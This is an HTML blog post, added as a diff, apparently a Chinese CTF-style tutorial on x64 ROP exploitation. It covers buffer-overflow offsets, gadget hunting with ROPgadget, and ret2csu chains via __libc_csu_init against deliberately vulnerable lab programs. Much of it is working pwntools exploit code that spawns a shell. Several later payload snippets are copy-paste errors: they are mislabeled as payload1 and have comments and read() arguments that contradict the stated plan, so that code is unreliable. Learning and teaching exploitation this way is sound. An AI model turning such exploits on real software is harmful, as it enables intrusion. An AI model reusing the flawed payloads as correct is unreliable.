@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>一步一步学ROP之x64篇 | √素顏☃繁華夢☪</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="0x1 linux_64与linux_86的区别linux_64与linux_86的区别主要有两点：首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一步一步学ROP之x64篇">
+<meta property="og:url" content="http://yoursite.com/2017/10/14/一步一步学ROP之x64篇/index.html">
+<meta property="og:site_name" content="√素顏☃繁華夢☪">
+<meta property="og:description" content="0x1 linux_64与linux_86的区别linux_64与linux_86的区别主要有两点：首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数">
+<meta property="og:image" content="http://ote495tnr.bkt.clouddn.com/30.png">
+<meta property="og:image" content="http://ote495tnr.bkt.clouddn.com/31.png">
+<meta property="og:image" content="http://ote495tnr.bkt.clouddn.com/37.png">
+<meta property="og:updated_time" content="2017-10-14T13:33:29.540Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="一步一步学ROP之x64篇">
+<meta name="twitter:description" content="0x1 linux_64与linux_86的区别linux_64与linux_86的区别主要有两点：首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数">
+<meta name="twitter:image" content="http://ote495tnr.bkt.clouddn.com/30.png">
+  
+    <link rel="alternate" href="/atom.xml" title="√素顏☃繁華夢☪" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="http://ote495tnr.bkt.clouddn.com/touxiang.jpg">
+    <h2 class="author">XiaoRui</h2>
+    <h3 class="description">奋斗中的小白</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>14</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>8</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-一步一步学ROP之x64篇" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/10/14/一步一步学ROP之x64篇/" class="article-date">
+  <time class="post-time" datetime="2017-10-14T05:59:42.000Z" itemprop="datePublished">
+    <span class="post-month">10月</span><br/>
+    <span class="post-day">14</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      一步一步学ROP之x64篇
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <a id="more"></a>
+<h4 id="0x1-linux-64与linux-86的区别"><a href="#0x1-linux-64与linux-86的区别" class="headerlink" title="0x1 linux_64与linux_86的区别"></a>0x1 linux_64与linux_86的区别</h4><p>linux_64与linux_86的区别主要有两点：首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上。还是通过实际例子进行讲解吧，level3的程序如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">void callsystem()</div><div class="line">&#123;</div><div class="line">    system(&quot;/bin/sh&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void vulnerable_function() &#123;</div><div class="line">    char buf[128];</div><div class="line">    read(STDIN_FILENO, buf, 512);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char** argv) &#123;</div><div class="line">    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);</div><div class="line">    vulnerable_function();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>开启ASLR并用如下的方法编译：<br><code>gcc -fno-stack-protector level3.c -o level3</code><br>通过分析源码，可以看到想要获取这个程序的shell非常简单，只需要控制PC指针跳转到callsystem()这个函数的地址上即可。因为程序本身在内存中的地址不是随机的，所以不用担心函数的地址会发生改变。接下来就是找找出栈溢出点。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ pattern create 150</div><div class="line">&apos;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&apos;</div></pre></td></tr></table></figure></p>
+<p>运行后输入这段字符串造成程序崩溃。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ r</div><div class="line">Starting program: /home/ruirui/Desktop/level3 </div><div class="line">Hello, World</div><div class="line">AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">0x00000000004005e7 in vulnerable_function ()</div></pre></td></tr></table></figure></p>
+<p>我们可以看到PC指针并没有指向类似于<code>0x41414141</code>那样的地址，而是停在了<code>vulnerable_function()</code>函数中。这是为什么？原因就是程序的使用的内存地址不能大于<code>0x00007fffffffffff</code>,否则会抛出异常。但是，虽然PC不能跳转到那个地址，我们依然可以通过栈来计算溢出点。因为ret相当于”pop rip”指令，所以我们只要看一下栈顶的数值就能知道PC跳转的地址了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ x/gx $rsp</div><div class="line">0x7fffffffdec8:	0x41416d4141514141</div></pre></td></tr></table></figure></p>
+<p>在GDB里，x是查看内存的指令，随后的gx代表数值用64位16进制显示。随后我们就可以用pattern.py来计算溢出点。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ pattern offset 0x41416d4141514141</div><div class="line">4702159612987654465 found at offset: 136</div></pre></td></tr></table></figure></p>
+<p>可以看到溢出点为136字节。我们再构造一次payload，并且跳转到一个小于<code>0x00007fffffffffff</code>的地址，看看这次能否控制pc的指针。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">python -c &apos;print &quot;A&quot;*136&apos;</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</div><div class="line"></div><div class="line">gdb-peda$ r</div><div class="line">Starting program: /home/ruirui/Desktop/level3 </div><div class="line">Hello, World</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEF</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line"></div><div class="line">0x00000000004005e7 in vulnerable_function ()</div><div class="line">gdb-peda$ x/gx $rsp</div><div class="line">0x7fffffffdec8:	0x000a464544434241</div></pre></td></tr></table></figure></p>
+<p>我们已经成功的控制了PC的指针了。所以最终的exp如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">elf = ELF(&apos;level3&apos;)</div><div class="line"></div><div class="line">p = process(&apos;./level3&apos;)</div><div class="line">#p = remote(&apos;127.0.0.1&apos;,10001)</div><div class="line"></div><div class="line">callsystem = 0x00000000004005b6</div><div class="line"></div><div class="line">payload = &quot;A&quot;*136 + p64(callsystem)</div><div class="line"></div><div class="line">p.send(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+<p>执行后的结果：<br><img src="http://ote495tnr.bkt.clouddn.com/30.png" alt=""></p>
+<h4 id="0x2-使用工具寻找gadgets"><a href="#0x2-使用工具寻找gadgets" class="headerlink" title="0x2 使用工具寻找gadgets"></a>0x2 使用工具寻找gadgets</h4><p>我们之前提到x86中参数都是保存在栈上,但在x64中前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9寄存器里，如果还有更多的参数的话才会保存在栈上。所以我们需要寻找一些类似于pop rdi; ret的这种gadget。如果是简单的gadgets，我们可以通过objdump来查找。但当我们打算寻找一些复杂的gadgets的时候，还是借助于一些查找gadgets的工具比较方便。比较有名的工具有：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ROPEME: https://github.com/packz/ropeme</div><div class="line">Ropper: https://github.com/sashs/Ropper</div><div class="line">ROPgadget: https://github.com/JonathanSalwan/ROPgadget/tree/master</div><div class="line">rp++: https://github.com/0vercl0k/rp</div></pre></td></tr></table></figure></p>
+<p>下面结合例子讲解，先看一下目标程序的源码level4.c：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;dlfcn.h&gt;</div><div class="line"></div><div class="line">void systemaddr()</div><div class="line">&#123;</div><div class="line">    void* handle = dlopen(&quot;libc.so.6&quot;, RTLD_LAZY);</div><div class="line">    printf(&quot;%p\n&quot;,dlsym(handle,&quot;system&quot;));</div><div class="line">    fflush(stdout);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void vulnerable_function() &#123;</div><div class="line">    char buf[128];</div><div class="line">    read(STDIN_FILENO, buf, 512);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char** argv) &#123;</div><div class="line">    systemaddr();</div><div class="line">    write(1, &quot;Hello, World\n&quot;, 13);</div><div class="line">    vulnerable_function();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>编译方法：<br><code>gcc -fno-stack-protector level4.c -o level4 -ldl</code></p>
+<p>首先目标程序会打印system()在内存中的地址，这样的话就不需要我们考虑ASLR的问题了，只需要想办法触发buffer overflow然后利用ROP执行system(“/bin/sh”)。但为了调用system(“/bin/sh”)，我们需要找到一个gadget将rdi的值指向“/bin/sh”的地址。于是我们使用ROPGadget搜索一下level4中所有pop ret的gadgets。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">ROPgadget --binary level4 --only &quot;pop|ret&quot;</div><div class="line">Gadgets information</div><div class="line">============================================================</div><div class="line">0x00000000004008ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</div><div class="line">0x00000000004008ae : pop r13 ; pop r14 ; pop r15 ; ret</div><div class="line">0x00000000004008b0 : pop r14 ; pop r15 ; ret</div><div class="line">0x00000000004008b2 : pop r15 ; ret</div><div class="line">0x00000000004008ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</div><div class="line">0x00000000004008af : pop rbp ; pop r14 ; pop r15 ; ret</div><div class="line">0x0000000000400700 : pop rbp ; ret</div><div class="line">0x00000000004008b3 : pop rdi ; ret</div><div class="line">0x00000000004008b1 : pop rsi ; pop r15 ; ret</div><div class="line">0x00000000004008ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</div><div class="line">0x0000000000400601 : ret</div><div class="line">0x0000000000400682 : ret 0x2009</div><div class="line"></div><div class="line">Unique gadgets found: 12</div></pre></td></tr></table></figure></p>
+<p>我测试的时候在目标程序中找了<code>pop rdi; ret</code>这个gadget。但是这个地址不能用，而libc.so.6中的gadget是可以的，这里困惑了我好久。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ROPgadget --binary libc.so.6 --only &quot;pop|ret&quot; | grep rdi</div><div class="line">0x0000000000020256 : pop rdi ; pop rbp ; ret</div><div class="line">0x0000000000021102 : pop rdi ; ret</div><div class="line">0x0000000000067499 : pop rdi ; ret 0xffff</div></pre></td></tr></table></figure></p>
+<p>现在找到了”pop rdi;ret”这个gadget了。可以开始构造ROP链了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">payload = &quot;\x00&quot;*136 + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr)</div></pre></td></tr></table></figure></p>
+<p>另外，因为我们只需要调用一次system()函数就可以获取shell，所以我们也可以搜索不带ret的gadget来构造ROP链。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">ROPgadget --binary libc.so.6 --only &quot;pop|call&quot; | grep rdi</div><div class="line">0x0000000000196a6b : call qword ptr [rdi + rbp*2 + 0x7fe40000]</div><div class="line">0x000000000019ada3 : call qword ptr [rdi + rbx + 2]</div><div class="line">0x000000000007d8b0 : call qword ptr [rdi]</div><div class="line">0x0000000000023e56 : call rdi</div><div class="line">0x00000000001073d9 : pop rax ; pop rdi ; call rax</div><div class="line">0x00000000001073da : pop rdi ; call rax</div></pre></td></tr></table></figure></p>
+<p>通过搜索结果我们发现，<code>0x00000000001073d9 : pop rax ; pop rdi ; call rax</code>也可以完成我们的目标。首先将rax赋值为system()的地址，rdi赋值为“/bin/sh”的地址，最后再调用call rax即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">payload = &quot;\x00&quot;*136 + p64(pop_pop_call_addr) + p64(system_addr) + p64(binsh_addr)</div></pre></td></tr></table></figure></p>
+<p>也就是说这两个ROP链都可以完成我们的目标，随便选择一个进行攻击即可。最终exp如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">libc = ELF(&apos;libc.so.6&apos;)</div><div class="line"></div><div class="line">p = process(&apos;./level4&apos;)</div><div class="line">#p = remote(&apos;127.0.0.1&apos;,10001)</div><div class="line"></div><div class="line">binsh_addr_offset = next(libc.search(&apos;/bin/sh&apos;)) -libc.symbols[&apos;system&apos;]</div><div class="line">print &quot;binsh_addr_offset = &quot; + hex(binsh_addr_offset)</div><div class="line"></div><div class="line">pop_ret_offset = 0x0000000000021102 - libc.symbols[&apos;system&apos;]</div><div class="line">print &quot;pop_ret_offset = &quot; + hex(pop_ret_offset)</div><div class="line"></div><div class="line">#pop_pop_call_offset = 0x00000000000f4739 - libc.symbols[&apos;system&apos;]</div><div class="line">#print &quot;pop_pop_call_offset = &quot; + hex(pop_pop_call_offset)</div><div class="line"></div><div class="line">print &quot;\n##########receiving system addr##########\n&quot;</div><div class="line">system_addr_str = p.recvuntil(&apos;\n&apos;)</div><div class="line">system_addr = int(system_addr_str,16)</div><div class="line">print &quot;system_addr = &quot; + hex(system_addr)</div><div class="line"></div><div class="line">binsh_addr = system_addr + binsh_addr_offset</div><div class="line">print &quot;binsh_addr = &quot; + hex(binsh_addr)</div><div class="line"></div><div class="line"></div><div class="line">pop_ret_addr = system_addr + pop_ret_offset</div><div class="line">print &quot;pop_ret_addr = &quot; + hex(pop_ret_addr)</div><div class="line"></div><div class="line">#pop_pop_call_addr = system_addr + pop_pop_call_offset</div><div class="line">#print &quot;pop_pop_call_addr = &quot; + hex(pop_pop_call_addr)</div><div class="line"></div><div class="line">p.recv()</div><div class="line"></div><div class="line">payload = &quot;\x00&quot;*136 + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr) </div><div class="line"></div><div class="line">#payload = &quot;\x00&quot;*136 + p64(pop_pop_call_addr) + p64(system_addr) + p64(binsh_addr) </div><div class="line"></div><div class="line">print &quot;\n##########sending payload##########\n&quot;</div><div class="line">p.send(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+<p>运行的结果如下：<br><img src="http://ote495tnr.bkt.clouddn.com/31.png" alt=""></p>
+<h4 id="0x3-通用gadgets"><a href="#0x3-通用gadgets" class="headerlink" title="0x3 通用gadgets"></a>0x3 通用gadgets</h4><p>因为程序在编译过程中会加入一些通用函数用来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但是初始化的过程是相同的，因此针对这些初始化函数，我们可以提取一些通用的gadgets加以使用，从而达到我们想要达到的效果。<br>level3和level4的程序都留了一些辅助函数在程序中，这次我们将这些辅助函数去掉再来挑战一下。目标程序level5.c如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">void vulnerable_function() &#123;</div><div class="line">    char buf[128];</div><div class="line">    read(STDIN_FILENO, buf, 512);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char** argv) &#123;</div><div class="line">    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);</div><div class="line">    vulnerable_function();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>可以看到这个程序仅仅只有一个buffer overflow，也没有任何的辅助函数可以使用，所以我们要先想办法泄露内存信息，找到system()的值，然后再传递“/bin/sh”到.bss段, 最后调用system(“/bin/sh”)。因为原程序使用了write()和read()函数，我们可以通过write()去输出write.got的地址，从而计算出libc.so在内存中的地址。但问题在于write()的参数应该如何传递，因为x64下前6个参数不是保存在栈中，而是通过寄存器传值。我们使用ROPgadget并没有找到类似于<code>pop rdi, ret</code>,<code>pop rsi, ret</code>这样的gadgets。那应该怎么办呢？其实在x64下有一些万能的gadgets可以利用。比如说我们用<code>objdump -d ./level5</code>观察一下<code>__libc_csu_init()</code>这个函数。一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">00000000004005c0 &lt;__libc_csu_init&gt;:</div><div class="line">  4005c0:	41 57                	push   %r15</div><div class="line">  4005c2:	41 56                	push   %r14</div><div class="line">  4005c4:	41 89 ff             	mov    %edi,%r15d</div><div class="line">  4005c7:	41 55                	push   %r13</div><div class="line">  4005c9:	41 54                	push   %r12</div><div class="line">  4005cb:	4c 8d 25 3e 08 20 00 	lea    0x20083e(%rip),%r12        # 600e10 &lt;__frame_dummy_init_array_entry&gt;</div><div class="line">  4005d2:	55                   	push   %rbp</div><div class="line">  4005d3:	48 8d 2d 3e 08 20 00 	lea    0x20083e(%rip),%rbp        # 600e18 &lt;__init_array_end&gt;</div><div class="line">  4005da:	53                   	push   %rbx</div><div class="line">  4005db:	49 89 f6             	mov    %rsi,%r14</div><div class="line">  4005de:	49 89 d5             	mov    %rdx,%r13</div><div class="line">  4005e1:	4c 29 e5             	sub    %r12,%rbp</div><div class="line">  4005e4:	48 83 ec 08          	sub    $0x8,%rsp</div><div class="line">  4005e8:	48 c1 fd 03          	sar    $0x3,%rbp</div><div class="line">  4005ec:	e8 0f fe ff ff       	callq  400400 &lt;_init&gt;</div><div class="line">  4005f1:	48 85 ed             	test   %rbp,%rbp</div><div class="line">  4005f4:	74 20                	je     400616 &lt;__libc_csu_init+0x56&gt;</div><div class="line">  4005f6:	31 db                	xor    %ebx,%ebx</div><div class="line">  4005f8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)</div><div class="line">  4005ff:	00 </div><div class="line">  400600:	4c 89 ea             	mov    %r13,%rdx</div><div class="line">  400603:	4c 89 f6             	mov    %r14,%rsi</div><div class="line">  400606:	44 89 ff             	mov    %r15d,%edi</div><div class="line">  400609:	41 ff 14 dc          	callq  *(%r12,%rbx,8)</div><div class="line">  40060d:	48 83 c3 01          	add    $0x1,%rbx</div><div class="line">  400611:	48 39 eb             	cmp    %rbp,%rbx</div><div class="line">  400614:	75 ea                	jne    400600 &lt;__libc_csu_init+0x40&gt;</div><div class="line">  400616:	48 83 c4 08          	add    $0x8,%rsp</div><div class="line">  40061a:	5b                   	pop    %rbx</div><div class="line">  40061b:	5d                   	pop    %rbp</div><div class="line">  40061c:	41 5c                	pop    %r12</div><div class="line">  40061e:	41 5d                	pop    %r13</div><div class="line">  400620:	41 5e                	pop    %r14</div><div class="line">  400622:	41 5f                	pop    %r15</div><div class="line">  400624:	c3                   	retq</div></pre></td></tr></table></figure>
+<p>我们可以看到利用0×40061a处的代码我们可以控制rbx,rbp,r12,r13,r14和r15的值，随后利用0x400600处的代码我们将r13的值赋值给rdx, r14的值赋值给rsi,r15的值赋值给edi，随后就会调用<code>call qword ptr [r12+rbx*8]</code>。这时候我们只要再将rbx的值赋值为0，再通过精心构造栈上的数据，我们就可以控制pc去调用我们想要调用的函数了（比如说write函数）。执行完call qword ptr [r12+rbx*8]之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。大概思路就是这样，我们下来构造ROP链。</p>
+<p>我们先构造payload1，利用write()输出write在内存中的地址。注意我们的gadget是<code>call qword ptr [r12+rbx*8]</code>，所以我们应该使用<code>write.got</code>的地址而不是<code>write.plt</code>的地址。并且为了返回到原程序中，重复利用buffer overflow的漏洞，我们需要继续覆盖栈上的数据，直到把返回值覆盖成目标函数的main函数为止。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#rdi=  edi = r15,  rsi = r14, rdx = r13</div><div class="line">#write(rdi=1, rsi=write.got, rdx=4)</div><div class="line">payload1 =  &quot;\x00&quot;*136</div><div class="line">payload1 += p64(0x40061a) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret</div><div class="line">payload1 += p64(0x400600) # mov rdx, r13; mov rsi, r14; mov edi, r15d; call qword ptr [r12+rbx*8]</div><div class="line">payload1 += &quot;\x00&quot;*56</div><div class="line">payload1 += p64(main)</div></pre></td></tr></table></figure></p>
+<p>当我们exp在收到write()在内存中的地址后，就可以计算出system()在内存中的地址了。接着我们构造payload2，利用read()将system()的地址以及“/bin/sh”读入到.bss段内存中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#rdi=  edi = r15,  rsi = r14, rdx = r13</div><div class="line">#write(rdi=1, rsi=write.got, rdx=4)</div><div class="line">payload1 =  &quot;\x00&quot;*136</div><div class="line">payload1 += p64(0x40061a) + p64(0) +p64(0) + p64(1) + p64(got_read) + p64(1) + p64(got_read) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret</div><div class="line">payload1 += p64(0x400600) # mov rdx, r13; mov rsi, r14; mov edi, r15d; call qword ptr [r12+rbx*8]</div><div class="line">payload1 += &quot;\x00&quot;*56</div><div class="line">payload1 += p64(main)</div></pre></td></tr></table></figure>
+<p>最后我们构造payload3,调用system()函数执行“/bin/sh”。注意，system()的地址保存在了.bss段首地址上，“/bin/sh”的地址保存在了.bss段首地址+8字节上。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#rdi=  edi = r15,  rsi = r14, rdx = r13</div><div class="line">#system(rdi = bss_addr+8 = &quot;/bin/sh&quot;)</div><div class="line">payload1 =  &quot;\x00&quot;*136</div><div class="line">payload1 += p64(0x40061a) + p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret</div><div class="line">payload1 += p64(0x400600) # mov rdx, r13; mov rsi, r14; mov edi, r15d; call qword ptr [r12+rbx*8]</div><div class="line">payload1 += &quot;\x00&quot;*56</div><div class="line">payload1 += p64(main)</div></pre></td></tr></table></figure>
